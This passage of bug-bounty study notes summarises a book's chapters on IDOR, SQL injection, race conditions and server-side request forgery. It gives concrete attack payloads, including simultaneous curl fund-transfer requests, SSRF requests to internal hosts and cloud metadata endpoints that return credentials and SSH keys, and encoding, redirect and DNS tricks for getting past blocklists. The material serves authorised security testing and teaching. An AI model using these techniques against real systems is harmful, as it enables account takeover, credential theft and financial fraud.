  - One account is the attacker and the other is the victim (used to observe the effects).
- You may need to contact the company to get access to so many accounts.
- If the different levels of privileges are locked behind a paywall, you may be able to ask the company for free accounts for testing but paying for an account can also pay off.
- You should also test while not logged in to see if you can use an unauthenticated session to access the information or functionalities only available to legitimate users.

_Step 2: Discover Features_

- Use the highest privilege account you own and go through the application looking for application features to test.
- Pay attention to functionalities that return user information or modify user data.
- Examples of features that may have IDORs:

  - Endpoint for reading user messages:
    `https://example.com/messages?user_id=1234`
  - Endpoint for reading user files:
    `https://example.com/uploads?file=user1234-1.jpeg`
  - Endpoint for deleting user messages:

    ```
    POST /delete_message

    (POST request body)
    message_id=user1234-0111
    ```

  - Endpoint for accessing group files:
    `https://example.com/group_files?group=group3`
  - Endpoint for deleted a group:

    ```
    POST /delete_group

    (POST request body)
    group=group3
    ```

_Step 3: Capture Requests_

- "Browse through each application feature you mapped in the preceding step and capture all the requests going from your web client to the server, Inspect each request carefully and find the parameters that contain numbers, user-names, or IDs."
  - IDORs can be triggered from different locations from within a request: URL parameters, form fields, filepaths, headers, and cookies.
- Use two browsers to log into a different accounts.
  - Use one browser and user to attack the other browser and user and look for signs of the attacks success.
  - Use Burp or Zap to modify the traffic from Firefox then check if the attack was successful on the account using, for example, Chrome.
- REST and GraphQL APIs are also often vulnerable to IDOR attacks.

_Step 4: Change the IDs_

- Check if you can access the victim account's information by using the attacker account.
- Check if you can modify the second user's account from the first.
  - Use the endpoints you found in Step 2 and if any of your requests succeed in accessing or modifying an alternative users information, you've found an IDOR.

**Bypassing IDOR Protection**

- "IDORs aren't always as simple as switching out a numeric ID. As applications become more functionally complex, the way they reference resources also often becomes more complex. Modern web applications have also begin implementing more protection against IDORs, and many now use more complex ID formats."

_Encoded IDs and Hashed IDs_

- Always try to decode high entropy strings. They may be encoded and not hashed, giving you the info you need after decoding.
  - ex: `https://example.com/messages?user_id=MTIzNQ`
    - The user ID in the above example is base64url-encoded, so it can be decoded.
    - Once decoded, you may be able to execute an IDOR attack by base64url-encoding another user ID. Decoding the user_id may also give you some good insight into the naming convention of IDs.
    - Burp has a Smart Decode tool to help identify and decode different encoding schemes.
    - You could also just try encoding it using a variety of schemes and see what works: URL encoding, HTML encoding, hex encoding, octal encoding, base64, base64url, etc.
  - (Not in the book) ex: `https://example.com/messages?user_id=7110eda4d09e062aa5e4a390b0a572ac0d2c0220`
    - The above is a SHA1 hash of "1234," This cannot be decoded, but it could be brute forced (because 1234 would be easy to bruteforce...).
    - You can do this by using a tool like JohnTheRipper or HashCat and a file containing a list of suspected user IDs.
    - This is made easier by using a hash identifier.
- Compare IDs even when they appear hashed or randomized. If the application uses an algorithm that doesn't randomize quite well enough, you may be able to detect a pattern.

_Leaked IDs_

- "It might also be possible that the application leaks IDs via another API endpoint or other public pages of the application, like the profile page of a user. I once found an API endpoint that allowed users to retrieve detailed direct messages through a hashed `conversation_id` value... But later i found that anyone could request a list of `conversation_ids` for each users, just by using their public user ID!"
  - The random `convesation_id` looked like this: `GET /messages?conversation_id=01SUR7GJ43HS93VAR8xxxx`
  - The request to get a list of conversation_ids from the API using public user_ids looked like this: `GET /messages?user_id=1236`
  - The user ID was publicly available, so it was easy to get a list of all of their conversation_id's and read all of their private messages.

_Offer the Application an ID, Even If It Doesn't Ask for One_

- "In modern web applications, you'll commonly encounter scenarios in which the application uses cookies instead of IDs to identify the resources a user can access."
  - ex: When you send a GET request to an endpoint, the app will deduce your identity based on your session cookie, and send the messages asoociated with that user.
  ```
  GET /api_v1/messages
  Host: example.com
  Cookies: sessions=YOUR_SESSION_COOKIE
  ```
  - If the web app has an alternative way of retrieving resources, using object IDs, the app may still be vulnerable to IDORs.
  - Append an id, user_id, message_id, or other object references to the URL query to see if it makes a difference in the applications behavior
    `GET /api_v1/messages?user_id=ANOTHER_USERS_ID`

_Keep an Eye Out for Blind IDORs_

- Sometimes the results of a successful IDOR are not leaked directly. They may instead be reflected in export files, email, text alerts, etc.

  - ex. An endpoint on example.com allows users to email themselves a receipt

  ```
  POST /get_receipt

  (POST request body)
  receipt_id=3001
  ```

  - All receipts should be unique, regardless of the user, so if you were to request the receipt of another user, you may have it emailed to you instead.

- You may also have to wait a while, if you were to successfully exploit an endpoint that generates a monthly report, it may take up to a month to see the results.

_Change Request Method_

- Try all requests methods: GET, POST, PUT, DELETE, PATCH, HEAD, CONNECT, OPTIONS, TRACE, etc.

  - Applications often enable multiple request methods but fail to implement the same access control for each method
  - ex. a GET request might fail but a DELETE request might succeed:
    `GET example.com/uploads/user1234-01.jpeg` - FAILED
    `DELETE example.com/uploads/user1234-01.jpeg` - SUCCESS!

  ```
  PUT example.com/uploads/user1234-01.jpeg

  (PUT request body)
  NEW_FILE
  ```

  - May be able to update or add the new file.

**Escalating the Attack**

"The impact of an IDOR depends on the affected function, so to maximize the severity of your bugs, you should always look for IDORs in critical functionalities first. Both _read-based_ IDORs (which leak information but do not alter the database) and _write-based_ IDORs (which can alter the database in an unauthorized way) can be of high impact"

- Look for state-changing (write-based) IDORs in password reset, password change, account recovery features, etc.
  - These should pay more than features that change email subscription settings, for example.
- Look for non-state-changing (read-based) IDORs that handle sensitive information like direct messages, personal information, private content.
  - Consider which application functionalities make use of this information and look for IDORs accordingly.
- Combine IDORs with self-XSS to form a stored XSS.
- An IDOR on a password reset endpoint combined with username enumeration can lead to a mass account takeover.
- A write IDOR on an admin account may lead to RCE.

**Automating the Attack**

- Use Burp or your own scripts to automate IDORs after you've built up your skills.
  - Use Burp intruder to iterate through IDs to find valid ones.
  - Use Burp extension Autorize to scan for authorization issues by accessing higher-privileged accounts with lower-privileged accounts.
  - Burp Auto-Repeater and AuthMatrix allow you to automate the process of switching out cookies, headers, and parameters.
  - Check out the BAppStore in Burp to find more extensions.

**Finding Your First IDOR!**

1. Create two accounts for each application role and designate one as the attacker account and the other as the victim account.
2. Discover features in the application that might lead to IDORs. Pay attention to features that return sensitive information or modify user data.
3. Revisit the features you discovered in step 2. With a proxy, intercept your browser traffic while you browse through the sensitive functionalities.
4. With a proxy, intercept each sensitive request and switch out the IDs that you see in the requests. If switching out IDs grants you access to other user's information or lets you change their data, you might have found an IDOR.
5. Don't despair if the application seems to be immune to IDORs. Use this opportunity to try a protection-bypass technique! If the application uses an encoded, hashed, or randomized ID, you can try decoding or predicting the IDs. You can also try supplying the application with an ID when it does not ask for you. Finally, sometimes changing the request method type or file type makes all the difference.
6. Monitor for information leaks in export files, email, and text alerts. An IDOR now might lead to an info leak in the future.
7. Draft your first IDOR report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 11: SQL Injection

"SQL is a programming language used to query or modify information stored within a database. A SQL _injection_ is an attack in which the attacker executes arbitrary SQL commands on an application's database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database, and RCE in some cases."

- SQL injections are on the decline, since most web frameworks have built-in mechanisms that protect against them.
- If found, they tend to be critical vulnerabilities with high payouts.

  - Even though they are less common, the high payout makes them worth taking a look for.

- If you're interested in learning about SQL Injections, I'd recommend visiting [PortSwigger's academy](https://portswigger.net/web-security/sql-injection). They have labs and a lot of information on SQL injection, Cross-Site Scripting, Cross-site request forgery (CSRF), Race Conditions, etc.
  - Because of this resource, I'm going to skip through this section of the book, as PortSwigger is a better resource for learning about SQL Injection.
  - You can also use tools like [sqlmap](http://sqlmap.org) to automate the process of detecting and exploiting SQL injections. A full tutorial can be found [here](https://github.com/sqlmapproject/sqlmap/wiki/).

**Finding Your First SQL Injection!**

1. Map any of the application's endpoints that take in user input.
2. Insert test payloads into these locations to discover whether they're vulnerable to SQL injections. If the endpoint isn't vulnerable to classic SQL injections, try inferential techniques instead.
3. Once you've confirmed that endpoint is vulnerable to SQL injections, use different SQl injection queries to leak information from the database.
4. Escalate the issue. Figure out what data you can leak from the endpoint and whether you can achieve an authentication bypass. Be careful not to execute and actions that would damage the integrity of the target's database, such as deleting user data or modifying the structure of the database.
5. Finally, draft up your first SQL injection report with an example payload that the security team can use to duplicate your results. Because SQL injections are quite technical to exploit most of the time, it's a good idea to spend some time crafting an easy-to-understand proof of concept.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 12: Race Conditions

"Race conditions are one of the most interesting vulnerabilities in modern web applications. They stem from simple programming mistakes developers often make, and these mistakes have proved costly: attacker have used race conditions to steal money from online banks, e-commerce sites, stock brokerages, and cryptocurrency exchanges."

**Mechanisms**

- A _race condition_ occurs when two sections of code that are designed to execute in sequence get executed out of sequence.
- _Concurrency_ is the ability to execute different parts of a program simultaneously without affecting the outcome of the program.
  - Concurrency is used to drastically improve the performance of a program by having multiple parts of the programs code execute at the same time.
  - Two types of Concurrency: Multiprocessing and multithreading.
    - Multiprocessing: Using multiple central processing units (CPUs), the hardware that executes instructions, to perform simultaneous computations.
    - Multithreading: The use of a single CPU that has multiple threads to perform concurrent executions.
      - The threads take turns using the CPUs computational power.
      - ex. If one thread is suspended while waiting for user input, another can take over the CPU to execute computations.
      - Arranging the sequence of execution of multiple threads is called _scheduling_. There are different scheduling algorithms that are selected for different performance priorities.
        - Some algos may execute the highest-priority tasks first, with others might execute tasks by giving out computational power in turns (regardless of priority).
        - **These flexible scheduling schemes are what create race conditions.**
- Race conditions occur when devs don't adhere to certain safe concurrency principles.

  - Since the scheduling algo can swap between the execution of two threads at any time, you can't predict the sequence in which the threads execute each action.

- ex. [Found here](https://en.wikipedia.org/wiki/Race_condition)
  - Two concurrent threads of execution are each trying to increase the value of a global variable by 1. If the variable starts out with a value of 0, it should end up with a value of 2. Ideally, the threads would be executed in the stages shown in Table 12-1.

12-1:
| |Thread 1| Thread 2| Value of variable A|
|---|---|---|--|
|Stage 1| | | 0 |
|Stage 2| Read value of A| | 0|
|Stage 3| Increase A by 1| | 0|
|Stage 4| Write the value of A| | 1|
|Stage 5| | Read value of A| 1|
|Stage 6| | Increase A by 1| 1|
|Stage 7| | Write the value of A| 2|

- If the two threads are run simultaneously, without any consideration of the conflicts that may occur when accessing the same resource, the execution coul dbe scheduled as in Table 12-2.

12-2
| |Thread 1| Thread 2| Value of variable A|
|-------|--------|---------|--------------------|
|Stage 1| | | 0 |
|Stage 2| Read value of A| | 0 |
|Stage 3| | Read value of A | 0 |
|Stage 4| Increase A by 1| | 0 |
|Stage 5| | Increase A by 1| 0 |
|Stage 6| Write the value of A | | 1 |
|Stage 7| | Write the value of A| 1 |

- "In summary, race conditions happen when the outcome of the xecution of one thread depends on the outcome of another thread, and when two threads operate on the same resources without considered that other threads are also using those resources. Certain programming languages, such as C/C++, are more prone to race conditions because of the way they manage memory.

**When a Race Condition Becomes a Vulnerability**

- When a race condition affects a security control mechanism, it becomes a vulnerability.
  - ex. When a sensitive action executes before a security check is completed.
  - Race conditions are often referred to as _time-of-check_ or _time-of-use_ vulnerabilities.
- Here's a juicy example:

|         | Thread 1                       | Thread 2                       | Balance of accounts A + B       |
| ------- | ------------------------------ | ------------------------------ | ------------------------------- |
| Stage 1 | Check account A balance ($500) |                                | $500                            |
| Stage 2 |                                | Check account A balance ($500) | $500                            |
| Stage 3 | Add $500 to account B          |                                | $1,000 ($500 in A, $500 in B)   |
| Stage 4 |                                | Add $500 to account B          | $1,500 ($500 in A, $1,000 in B) |
| Stage 5 | Deduct $500 from account A     |                                | $1,000 ($0 in A, $1,000 in B)   |
| Stage 6 |                                | Deduct $500 from account A     | $1,000 ($0 in A, $1,000 in B)   |

- Race Conditions aren't exclusive to banking sites. They could also be found in voting systems, video games (duping), etc.

**Prevention**

- Use _synchronization_ or other mechanisms to protect resources during execution by ensuring threads using the same resources don't execute simultaneously.
  - Resource locks are one of these mechanisms. They block other threads from operating on the same resources by _locking_ a resource.
    - In the banking example, Thread 1 could lock the balance of accounts A and B before modifying them so that Thread 2 would have to wait for it to finish before accessing the resources.
- Most programming languages that have concurrency abilities also have synchronization functionality built in.
  - Be aware of concurrency issues in your applications and apply synchronization measure accordingly.
- Follow the principle of least privilege to ensure Race Conditions don't extend into severe security issues.
  - The applications and processes should only be granted the privileges needed to complete their tasks.
    - If an app only requires read privileges, don't give it read/write/execute privileges.

**Hunting for Race Conditions**

- Just because it's simple, doesn't mean that it's easy! Race Conditions often require a bit of luck.

_Step 1: Find Features Prone to Race Conditions_

- Race conditions can be found in features that deal with numbers: online voting, online gaming scores, bank transfers, e-commerce payments, gift card balances, etc.
  - ex. You find a request that deals with transferring money from your banking site. Copy the request for testing - You can use **Copy as curl command** to copy from BurpSuite.

_Step 2: Send Simultaneous Requests_

- ex. If you have $3000 in your bank account, use curl to send multiple requests at once to see if you can transfer more than you have:
  - Use the curl command you've copied from BurpSuite to send multiple requests at once with the & operator: `curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds>`
  - Test for operations that should be allowed once and not multiple times.
  - If you have $3000, don't try to transfer $5000. If you have $3000 don't try to transfer $10. The first won't work at all and isn't worth testing; the second will work, but only as intended.

_Step 3: Check the Results_

- Did it work or not?
- The more requests you send at once, the more likely you are to be able to find a Race Condition exploit.

_Step 4: Create a Proof of Concept_

- ex. A PoC from our example:

1. Create an account with a $3,000 balance and another one with zero balance. The account with $3,000 will be the source account for our transfers, and the one with zero balance will be the destination.
2. Execute this command: `curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds> & curl <endpoint request to tansfer $3000 in funds>`

- This will attempt to transfer $3,000 to another account multiple times simultaneously.

3. You should see more than $3,000 in the destination account. Reverse the transfer and try the attack a few more times if you don't see more than $3,000 in the destination account.

- Make sure to include instructions to try again if the first attempt fails.
- (Not in the book):
  - Another thing that can change the outcome of a race condition is latency. You may have different results from a server located in close proximity to the target than you would from a server that is on the other side of the world from the target.
  - The amount of requests is important. You could successfully exploit an endpoint, but you haven't exploited it enough to overwhelm a final check on the status of the account.
    - Example: You successfully doubled the $3000 but the application checks for these double deposits and corrects them, however, it only does this for double deposits. If you were to triple or quadruple the deposit, it may only correct a portion of the duplicated funds.

**Finding Your First Race Condition!**

1. Spot the features prone to race conditions in the target application and copy the corresponding requests.
2. Send multiple of these critical requests to the server simultaneously. You should craft requests that should be allowed once but not allowed multiple times.
3. Check the results to see if your attack has succeeded. And try to execute the attack multiple times to maximize the chance fo success.
4. Consider the impact of the race condition you just found.
5. Draft up your first race condition report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 13: Server-Side Request Forgery

"_Server-side request forgery (SSRF)_ is a vulnerability that lets an attacker send requests on behalf of a server. During an SSRF, attackers forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a tework, bypass firewall controls, and gain access to internal services."

**Mechanisms**

"SSRF vulnerabilities occur when an attacker finds a way to send requests as a trusted server in the target's network. Imagine a public-facing web server on _example.com_'s network named _public.example.com._ This server hosts a proxy service, located at _public.example.com/proxy_, that fetches the web page specified in the _url_ parameter and displays it back to the user. For example, when the user accesses the following URL, the web application would display the google.com home page: `https://public.example.com/proxy?url=https://google.com`"

- If example.com has an internal server `admin.example.com` they would need to set up access controls to keep it from being reached via the internet. This may be done by creating an allowlist in the firewall that only allows machines with a valid IP (employee workstations) to access the panel.
  - You may be able to bypass the access controls by using the proxy to access the internal server with: `https://public.example.com/proxy?url=https://admin.example.com`
    - Because the request is coming from the public server, which most likely is on the allow list (or is in the IP range allowed by the allowlist) you may be able to access the admin panel and bypass the access control.
- Firewalls are generally implemented on the perimeter of the network, meaning that if you already have access to the internal network, you won't be blocked by the firewall.
- SSRF has two types: Regular SSRF and Blind SSRF.
  - Both types exploit the trust between machines on the same network.
  - In blind SSRF, the attacker does not receive feedback from the server via an HTTP response or error message.
    - ex. `https://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1`
    - In this example, the SSRF might work, but the attack won't know unless they can access user 1 to see if it has been deleted or not.
  - The example above is a regular SSRF as the attacker would see the success of the attack in the displaying of the admin panel.

**Prevention**

- If the server doesn't stop users from accessing internal resources using their public facing resources, an SSRF vulnerability occurs.

  - ex. _public.example.com_ allows users to upload a profile photo by retrieving it from a URL via this POST request:

    ```
    POST /upload_profile_from_url
    Host: public.example.com

    (POST request body)
    user_id=1234&url=https://www.attacker.com/profile.jpeg
    ```

  - If the server does not make a distinction between internal and external resources, an attacker could just as easily request a local file stored on the server, or any other file on the network.
  - ex. This would cause the server to fetch the internal file and display it as the user's profile picture (if that file existed):

  ```
  POST /upload_profile_from_url
  Host: public.example.com

  (POST request body)
  user_id=1234&url=https://localhost/passwords.txt
  ```

- Two main types of protection against SSRFs: Blocklists and allowlists.
  - Blocklists are lists of banned addresses.
    - Using a blocklist you could block internal network addresses and reject any request that redirects to those addresses.
  - Allow lists allow only those URLs found in the predetermined list, and rejects all other requests.
    - The site could only allow uploads from dropbox, or some other service.
- Some servers also protect against SSRFs by requiring special headers or secret tokens in internal requests.

**Hunting for SSRFs**

- The best way to find SSRFs is through reviewing source code and looking for whether the application validates all user-provided URLs.
  - If you can't get the source code, test features that are most prone to SSRFs.

_Step 1: Spot Features Prone to SSRFs_

- SSRFs occur in features that require visiting and fetching external resources: webhooks, file uploads, document and image processors, link expansions or thumbnails, proxy services, any endpoint that processes user-provided URLs, URLs embedded in files that are processed by the application (XML files and PDF files can often be used to trigger SSRFs), hidden API endpoints that accept URLs as input, and input that get inserted into HTML tags.
  - Webhooks and proxy services are particularly juicy for SSRFs.
- Add a new webhook example:

  ```
  POST /webhook
  Host: public.example.com

  (POST request body)
  url=https://www.attacker.com
  ```

- File upload via URL:

  ```
  POST /upload_profile_from_url
  Host: public.example.com

  (POST request body)
  user_id=1234&url=https://attacker.com/profile.jpeg
  ```

- Proxy Service:
  ```
  https://public.example.com/proxy?url=https://google.com
  ```

_Step 2: Provide Potentially Vulnerable Endpoints with Internal URLs_

- Test the endpoints you've found with suspected internal addresses

  - Using local host or IPv4 addresses you suspect to be in use is usually a good starting point.
  - The book is light here, and suggest looking at Reserved_IP_addresses on [wikipedia](https://en.wikipedia.org/wiki/Reserved_IP_addresses)
  - The book uses Class C networks (255.255.255.0 default subnet mask), but these tend to be used in small home networks.
    - You're more likely to encounter Class A or Class B reserved classes with companies that are large enough to host bug bounty progams.
      |Name|First Octet|Number of subnets|Number of hosts|Range|Default subnet mask|Description|
      |Class A|1 to 126|126|Approx. 16.7 million|10.0.0.0|255.0.0.0|Larger networks with many hosts|
      |Class B|128 to 191|16,384|65,536|172.16.0.0|255.255.0.0|Medium networks with a moderate number of hosts|
      |Class C|192 to 233|Approximately 2.1 million|254|192.168.0.0|255.255.255.0|Smaller networks with fewer hosts|
  - ex. Webhook to (hopefully) local IPv4 address 192.168.0.1:

    ```
    POST /webhook
    Host: public.example

    (POST request body)
    url=https://192.168.0.1
    ```

  - ex. File upload functionality:

    ```
    POST /upload_profile_from_url
    Host: example.com

    (POST request body)
    user_id=1234&url=https://192.168.0.1
    ```

  - ex. test proxy service:

  ```
  https://example.com/proxy?url=https://192.168.0.1
  ```

_Step 3: Check the Results_

- See if the server returns a response that reveals information about the internal service.

  - Does it contain service banners or content from internal pages?
  - _Service Banners_ will return te name and version of software running on the machine
  - You can include a port number with the internal IP address to test for specific services:

    ```
    POST /upload_profile_from_url
    Host: public.example.com

    (POST request body)
    user_id=1234&url=127.0.0.1:22
    ```

  - Look for a response like this: `Error: cannot upload image: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4`
  - If you get a response that returns service information like this, you have an SSRF.

- For blind SSRF, you will need to use an out-of-band Techniques
  - You will need a public server that you control and that you get the target to send requests to.
  - You then monitor the server logs for the requests you've tried to get the target to send.
  - You will need to spend money on a domain, dynamic DNS provider, or BurpSuitePro.
    - The book mentions using Netcat instead, but that's like saying all you need is a bike tire to enter a bicycle race.
      - You could use netcat as a listener to view incoming requests as opposed to reviewing your server logs, but that's about it (to my knowledge).
      - Most people who use VPN connected hacking labs (like hachthebox.com - which is awesome!) misunderstand this because they _can_ use something like netcat to achieve the hack, but that's only because you're connected through a VPN and the target and your attack machine are on the same network. This won't work when you're trying to get an external server (target) to connect to your local attack machine without a dynamic DNS setup.
    - If you can afford the $400+ a year for BurpSuitePro, the Pro version has the Collaborator feature that gives you access to their public server for testing out-of-band attacks.
      - Buying your own domain will most likely be cheaper, but requires a lot more setup. If you have a website you use for your business, you could use this website for testing if you have enough control over it set things up.
  - Just getting a request from the target isn't proof of a successful blind SSRF, you will need to use the Blind SSRF attack to explore their internal network (read internal files, access internal services, etc.)
    - Make requests to different service ports (22, 80, 443, etc.). If you can get a 200 HTTP status code, it would indicate that you're able to connect to that HTTP service.
      - Check out HTTP status codes [here](https://www.semrush.com/blog/http-status-codes/?kw=&cmp=CA_SRCH_DSA_Blog_EN&label=dsa_pagefeed&Network=g&Device=c&utm_content=676606881983&kwid=dsa-2185834088336&cmpid=18361978716&agpid=155254834078&BU=Core&extid=105177813075&adpos=&gad_source=1&gclid=Cj0KCQjwhb60BhClARIsABGGtw8umQK3T9aTqEh51qTn8u33jbR21hKznczdGAcmMc7iMulRLn26N0saAt1REALw_wcB)
      - The book doesn't really go into detail about how to successfully prove an SSRF attack. Offensive Security, Hachthebox, and PortSwigger would be better resources for learning these techniques. I've had issues with Offensive Security that left a bad taste in my mouth, but HackTheBox and PortSwigger really get it right with their users/customers.
- You can use tools like [SSRFmap](https://github.com/swisskyrepo/SSRFmap/) to help in this process.

_Bypassing SSRF Protection_

- If you get a response like, "`Error. Resquests to this address are not allowed. Please try again.`" You've found something, but you'll have to bypass the protections (probably an allowlist or blocklist).

_Bypass Allowlists_

- These are generally the hardest to bypass because they are more strict by design than blocklists.

  - If you have found an open redirect as well, you can request an allowlisted URL that redirects to an internal URL.

    - ex. You have an open redirect on pics.example.com and redirect the request to 127.0.0.1 (loop back address):

    ```
    POST /upload_profile_from_url
    Host: public.example.com

    (POST request body)
    user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
    ```

  - Regexes are often used to construct more flexible allow lists.
    - Instead of checking whether a URL string is equal to "example.com", the site could use a regex expression like `.*example.com.*` to include the subdomains and filepaths of example.com as well.
    - You could then bypass the allow list by including example.com in your URL.
      - The open redirect already does this, otherwise you could create a subdomain of example.com.attacker.com to bypass.
      - ex. `user_id=1234&url=https://pics.example.com@127.0.0.1`: here, pics.example.com would be interpreted as the username.
      - `user_id=1234&url=https://127.0.0.1/pics.example.com`: here, pics.example.com would be seen as the directory portion of the url.

_Bypass Blocklists_

- Easier to bypass.

_Fooling It with Redirects_

- Make the server request to a URL you control and that redirects to the blockedlisted address.
  - ex. Initial request to, `https://public.example.com/proxy?url=https://attacker.com/ssrf`, then on your server (attacker.com/ssrf) host a file containing `<?php header("location: https://127.0.0.1"); ?>`.
    - This attack should bypass the blocklist because the URL submitted to the app does not itself contain any blocklisted addresses.

_Using IPv6 Addresses_

- Sometimes the SSRF protections a site has implemented for IPv4 are not set up for IPv6.
  - `::1` points to the localhost and `cf00::` is the first address on the private network.
    - I haven't used this, but I suspect it requires a bit of a different syntax than using domain names or IPv4 addresses to get it to work.
    - I _do_ know that to use an IPv6 address you would need to enclose the address in "[]"; you cannot write a port numbers inside the IPv6 address, the port number needs to be outside of the "[]"; Browsers automatically convert IPv6 into corresponding IPv4 representations before sending the request to the server, so you would probably need a tool or plugin that supports IPv6.
      - ex. IPv6 address: `user_id=1234&url=https://[<IPv6 address here>]:<port number>/path`
      - None of this is mentioned in the book and the book doesn't describe how to use an IPv6 address to bypass the blocklist.
  - [IPv6 wiki](https://en.wikipedia.org/wiki/IPv6_address)

_Tricking the Server with DNS_

- DNS records are used by computers to translate hostnames into IP addresses.
  - Most common DNS records are A and AAAA records.
    - A records point a hostname to an IPv4 address
    - AAAA records translate hostnames to IPv6 addresses.
- Modify the A/AAAA record of a domain you control and make it point to the internal addresses on the victim's network.
  - Checking A and AAAA records of your domain:
    - `nslookup DOMAIN`: for A records.
    - `nslookup DOMAIN -type=AAAA`: For AAAA records.
  - Use the domain registrar or web-hosting service's setting page to configure your DNS records.
    - ex. Namecheap: configure DNS records by going `Domain List` > `Manage Domain` > `Advanced DNS` > `Add New Record`.
  - Create a custom mapping of hostname to IP address and make your domain resolve to 127.0.0.1 - create an A record for your domain that points to 127.0.0.1.
    - You then get the target domain to send a request to your server, `https://public.example.com/proxy?url=https://attacker.com`.
    - When the target requests your domain, it will be pointed to 127.0.0.1 and request data from that address (itself).

_Switching Out the Encoding_

- Encoding methods don't change how a server interprets the location of the address, but they might allow the input to slip under the radar of a blocklist if it bans only address that are encoded in a certain way.
- Possible encoding methods: hex encoding, octal encoding, dword encoding, URl encoding, and mixed encoding.
  - If the URL parser of the target server does not process these encoding methods appropriately, you might be able to bypass SSRF protections.
- IP addresses use decimal encoding which is base-10 format that uses characters 0-9 (10.0.0.1).
- To translate decimal encoding to hex, use a decimal-to-hex calculator which would turn 127.0.0.1 into 0x7f.0x0.0x0.0x1 in hex.
  - `https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1`
- Decimal to octal (base-8 format) looks like this: `https://public.example.com/proxy?url=https://0177.0.0.1`
- Dword or double word encodes an IP address into a single 32-bit integer (called a dword).
  - You need to split the address into four octets (essentially split on the . of the IP address).
  - Write out the binary representation of each octet: 127.0.0.1 = 01111111.00000000.00000000.00000001 (remember they're 8 bits, so 8 numbers per octet). The book doesn't explain why you do this, it just goes into the math below that is barely related.
  - Do a bunch of math (or use a converter), 127 x 256^3 + 0 x 256^2 + 0 x 256^1 + 1 x 256^0, which = 2130706433. So `https://2130706433` would be interpreted the same as `https://127.0.0.1`.
    - The author was just trying to increase word count here?
- Mix and match encoding to see what happens: http://0177.0.0.0x1 would be the following mix: http://octal.decimal.decimal.hex
- Always think to yourself, "How would I implement a protection mechanism for this feature."
  - I would add: Think about what would be the easiest way, then think about what would be the hardest way. The dev's will likely be somewhere in-between with their implementation.
    - Looking up best practices for the protections you're trying to bypass can also be helpful. Start with the best practice and craft a payload that will test that the best practice has been implemented correctly. If it hasn't, your payload may succeed.

**Escalating the Attack**

- Use SSRF to scan the network for reachable hosts, port-scan internal machines to fingerprint internal services, collect instance metadata, bypass access controls, leak confidential data, and even execute code on reachable machines.

_Perform Network Scanning_

- To scan using an SSRF, you would need to iterate through all the possible IP addresses and port numbers you're interested in. This is probably best done through scripting to automate the process. If you want help with scripting tasks for hacking, you should definitely check out my [AI github](https://github.com/Xerips/AI/blob/main/Ollama/setup.md) to setup your own locally hosted AI.

**_Pull Instance Metadata_**

- Cloud computing services allow businesses to run their applications on other people's servers. Services like Amazon's Elastic Compute Cloud (EC2) offers an instance metadata tool that enables EC2 instances to access data about themselves by querying the API endpoint at 169.254.169.254.
  - _Instances_ are virtual servers used for running applications on a cloud provider's infrastructure (Google Cloud offers similar services).
  - These APi endpoints are accessible by default unless network admins specifically block or disable them. The information these services reveal is often extremely sensitive and could allow attackers to escalate SSRFs to serious information leaks and even RCE.

_Querying EC2 Metadata_

- If the target hosts its infrastructure on Amazon EC2, try querying various instance metadat about the host using this endpoint.
  - ex. `https://169.254.169.254/latest/meta-data/`
  - ex. With a SSRF vulnerable endpoint: `https://public.example.com/proxy?url=http://169.254.196.254/latest/meta-data`
  - These endpoints reveal information like API keys, Amazon S3 tokens, and passwords.
  - Useful API endpoints:
    - `http://169.254.169.254/latest/meta-data`: returns the list of available metadata that you can query.
    - `http://169.254.169.254/latest/meta-data/local-hostname/`: returns the internal hostname used by the host.
    - `http://169.254.169.254/latest/meta-data/security-credentials/ROLE_NAME`: returns the security credentials of that role.
    - `http://169.254.169.254/latest/dynamic/instance-identity/document/`: returns the private IP address of the current instance.
    - `http://169.254.169.254/latest/user-data/`: returns user data on the current instance.
  - API endpoint documentation for EC2: [https://docs.aws.amazon.com/AWSEC2/latest/Userguide/ec2-instance-metadata.html](https://docs.aws.amazon.com/AWSEC2/latest/Userguide/ec2-instance-metadata.html)

_Querying Google Cloud Metadata_

- Google implements additional security measures for its API endpoints, so querying Google Cloud Metadata APIv1 requires one of these special headers:
  ```
  Metadata-Flavor: Google
  X-Google-Metadata-Request: True
  ```
  - To bypass this, you cannot specify special headers for the forged request, but you could access the API via v1beta1 endpoints - and earlier version of the metadata API (confirmed shut down).
- Endpoints to target:
  - `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/tokens`: returns the access token of the default account on the instance.
  - `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys `: returns SSH keys that can connect to other instances in this project.
- API documentation [https://cloud.google.com/compute/docs/storing-retrieving-metadata/](https://cloud.google.com/compute/docs/storing-retrieving-metadata/).
  - v1beta1 is shut down, so to use this you will need to find a way to forge the headers.

_Network and Port Scanning Using HTTP Status Codes_

- HTTP status codes provide information about whether the request succeeded. By comparing responses codes returned for requests to different endpoints, we can infer which of them are valid.
  - ex. A request to `https://public.example.com/webhook?url=10.0.0.1` results in an HTTP Status code of 200, and a request to `https://public.example.com/webhook?url=10.0.0.2` results in an HTTP Status code of 500.
    - Based on these responses we can deduce that 10.0.0.1 is the address of a valid host, and 10.0.0.2 is not.
  - Port scanning works the same way.
  - If all requests return the same status code, the site might have implemented protection against SSRF.

_Network and Port Scanning using Server Response Times_

- You may be able to determine a network structure based on the time it takes for a server to respond.
- If it takes much longer to respond for some addresses, those network addresses might be unrouted or hidden behind a firewall.
